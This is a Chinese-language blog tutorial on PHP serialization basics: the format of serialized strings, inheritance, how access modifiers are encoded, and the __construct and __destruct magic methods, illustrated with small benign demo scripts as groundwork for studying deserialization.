<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php反序列化 | Hexo</title><meta name="author" content="ZLARYY"><meta name="copyright" content="ZLARYY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="php反序列化php序列化：序列化字符串：在学习反序列化之前需要了解什么是php序列化： 序列化是将对象转化为可存储或传输的字符串格式的过程。在php中，可以使用serialize()函数将对象，数组或其它数据类型序列化称为一个字符串，以便将其保存到文件或者进行网络传输。 通过以下代码，我们可以实现将一个对象序列化操作并输出序列化字符串： 12345678910111213&lt;?phpClas">
<meta property="og:type" content="article">
<meta property="og:title" content="php反序列化">
<meta property="og:url" content="https://zlaryy123.github.io/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="php反序列化php序列化：序列化字符串：在学习反序列化之前需要了解什么是php序列化： 序列化是将对象转化为可存储或传输的字符串格式的过程。在php中，可以使用serialize()函数将对象，数组或其它数据类型序列化称为一个字符串，以便将其保存到文件或者进行网络传输。 通过以下代码，我们可以实现将一个对象序列化操作并输出序列化字符串： 12345678910111213&lt;?phpClas">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://zlaryy123.github.io/img/avertar.png">
<meta property="article:published_time" content="2026-02-16T04:00:00.000Z">
<meta property="article:modified_time" content="2026-02-16T04:19:00.189Z">
<meta property="article:author" content="ZLARYY">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zlaryy123.github.io/img/avertar.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "php反序列化",
  "url": "https://zlaryy123.github.io/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
  "image": "https://zlaryy123.github.io/img/avertar.png",
  "datePublished": "2026-02-16T04:00:00.000Z",
  "dateModified": "2026-02-16T04:19:00.189Z",
  "author": [
    {
      "@type": "Person",
      "name": "ZLARYY",
      "url": "https://ZLARYY123.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zlaryy123.github.io/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'php反序列化',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">php反序列化</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">php反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-16T04:00:00.000Z" title="Created 2026-02-16 12:00:00">2026-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-16T04:19:00.189Z" title="Updated 2026-02-16 12:19:00">2026-02-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="php序列化："><a href="#php序列化：" class="headerlink" title="php序列化："></a>php序列化：</h2><h3 id="序列化字符串："><a href="#序列化字符串：" class="headerlink" title="序列化字符串："></a>序列化字符串：</h3><p>在学习反序列化之前需要了解什么是php序列化：</p>
<p>序列化是将对象转化为可存储或传输的字符串格式的过程。在php中，可以使用serialize()函数将对象，数组或其它<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B&spm=1001.2101.3001.7020">数据类型</a>序列化称为一个字符串，以便将其保存到文件或者进行网络传输。</p>
<p>通过以下代码，我们可以实现将一个对象序列化操作并输出序列化字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ECH</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意输出序列化字符串只能使用var_dump或者print_r，不能使用echo</strong></p>
<p>我们能看到代码执行结果为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;ZLARYY&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;xiexie&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;Chesmond&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;L47yY&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Arach&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们分析一下 这串序列化字符串的结构：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;ZLARYY&quot;</span>:<span class="number">3</span>:</span><br><span class="line">O：代表 Object（对象）</span><br><span class="line"><span class="number">6</span>：代表类名的长度（<span class="string">&quot;ZLARYY&quot;</span> 是 <span class="number">6</span> 个字符）</span><br><span class="line"><span class="string">&quot;ZLARYY&quot;</span>：类名</span><br><span class="line"><span class="number">3</span>：代表该对象包含 <span class="number">3</span> 个属性</span><br><span class="line"></span><br><span class="line"><span class="comment">//内部数据以第一个属性为例</span></span><br><span class="line"></span><br><span class="line">s:<span class="number">6</span>:<span class="string">&quot;xiexie&quot;</span>;i:<span class="number">2</span>;</span><br><span class="line"><span class="title function_ invoke__">Key</span> (属性名): s:<span class="number">6</span>:<span class="string">&quot;xiexie&quot;</span></span><br><span class="line">s：代表 String（字符串）</span><br><span class="line"><span class="number">6</span>：字符串长度</span><br><span class="line"><span class="string">&quot;xiexie&quot;</span>：具体的属性名</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Value</span> (属性值): i:<span class="number">2</span>;</span><br><span class="line">i:<span class="title function_ invoke__">Int</span>(整数)</span><br><span class="line"><span class="number">2</span>：具体的属性值 </span><br></pre></td></tr></table></figure>

<p>属性类型除了第一个的int之外还有string字符串以及bool布尔类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">5</span>:<span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">s:<span class="title function_ invoke__">String</span>(字符串)</span><br><span class="line"><span class="number">5</span>:属性值的长度</span><br><span class="line"><span class="string">&quot;L47yY&quot;</span>:具体的属性值</span><br><span class="line"></span><br><span class="line">b:<span class="number">1</span>;</span><br><span class="line">b:<span class="title function_ invoke__">Bool</span>(布尔型)</span><br><span class="line"><span class="number">1</span>:<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>可以看到序列化字符串中并不包含我们的ECH方法</p>
<h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>我们还可以使用extends继承类，子类可以继承父类的属性和方法比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Doing</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Studying&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arach</span> <span class="keyword">extends</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$private</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Arach</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;age = <span class="number">19</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;sex = <span class="string">&quot;man&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Doing</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%BB%A7%E6%89%BF.png" class="" title="继承">

<p>在Arach类中，我们没有定义age属性和Doing方法，却能实现调用，这就是类的继承</p>
<h3 id="访问修饰符-："><a href="#访问修饰符-：" class="headerlink" title="访问修饰符 ："></a>访问修饰符 ：</h3><p>访问修饰符（Access Modifiers）是面向对象编程中用于控制类、方法、变量等成员访问权限的关键字。它们定义了代码的可见性，通过封装实现信息隐藏，防止不当的外部访问，保护数据的安全性。主要的访问级别包括公开（public）、私有（private）和受保护（protected）</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%AC%94%E8%AE%B0.png" class="" title="笔记">

<p>由图可以看到，public无论在哪里都可以访问，protected只有在类中和子类中可以访问，private只可以在类中调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Doing</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Studying&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arach</span> <span class="keyword">extends</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$private</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Arach</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;age = <span class="number">19</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;sex = <span class="string">&quot;man&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Doing</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>

<p>当我们把父类的sex属性更改为protected之后在类外使用echo调用会出现如下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Cannot access protected property Arach::$sex in D:\phpstudy_pro\WWW\exercise.php on line 16</span><br></pre></td></tr></table></figure>

<p>显示无法访问，原因是我们在类的外对Arach继承ZLARYY类的sex做了赋值，同理private属性更加严格</p>
<p>但如果我们在子类的内部进行调用就不会报错了：</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/protected.png" class="" title="protected">

<p>那么不同的访问修饰符在序列化之后的字符串会不会有什么变化？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ECH</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br></pre></td></tr></table></figure>

<p>以这串代码为例，输出的序列化字符串为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;ZLARYY&quot;:3:&#123;s:6:&quot;xiexie&quot;;i:2;s:11:&quot;*Chesmond&quot;;s:5:&quot;L47yY&quot;;s:13:&quot;ZLARYYArach&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>直接输出貌似还差了一点内容，我们对输出内容进行一下URL编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22ZLARYY%22%3A3%3A%7Bs%3A6%3A%22xiexie%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00Chesmond%22%3Bs%3A5%3A%22L47yY%22%3Bs%3A13%3A%22%00ZLARYY%00Arach%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<p>值得注意的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%00%2A%00Chesmond //protected属性序列化字符串会在属性名前面加上%00*%00</span><br><span class="line">%00ZLARYY%00Arach //private属性序列化字符串格式为：%00类型名%00属性名</span><br></pre></td></tr></table></figure>

<h2 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h2><p>PHP魔术方法<code>（Magic Methods）</code>是一组特殊的方法，它们在特定的情况下会被自动调用，用于实现对象的特殊行为或提供额外功能。这些方法的名称都以双下划线开头和结尾，例如: <code>__construct()</code>、<code>__toString()</code>等。</p>
<p>魔术方法可以帮助我们实现一些特殊的行为，例如对象的初始化、属性的访问控制、对象的转换等。通过合理利用魔术方法，我们可以增强PHP对象的灵活性和功能性。</p>
<p><strong>魔术方法是构造POP链的重点，尤其掌握各种魔术方法的触发时机</strong></p>
<h3 id="construct-："><a href="#construct-：" class="headerlink" title="__construct()："></a>__construct()：</h3><p>类的构造函数，在类实例化对象时自动调用构造函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>通过这串代码执行的结果我们能直观地看到__construct方法在第几行触发</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/construct.png" class="" title="construct">

<p>可见，__construct方法在对象生成时，也就是new的时候就触发了</p>
<p>同时，如果我们给__construct带上一个参数，那么他也能实现赋值操作：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>(<span class="string">&quot;2l47yY&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E8%B5%8B%E5%80%BC.png" class="" title="赋值">

<h3 id="destruct-："><a href="#destruct-：" class="headerlink" title="__destruct()："></a>__destruct()：</h3><p>类的析构函数，在对象销毁之前自动调用析构函数，或者说脚本执行结束，unset时会调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种：脚本执行结束</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/destruct1.png" class="" title="destruct1">

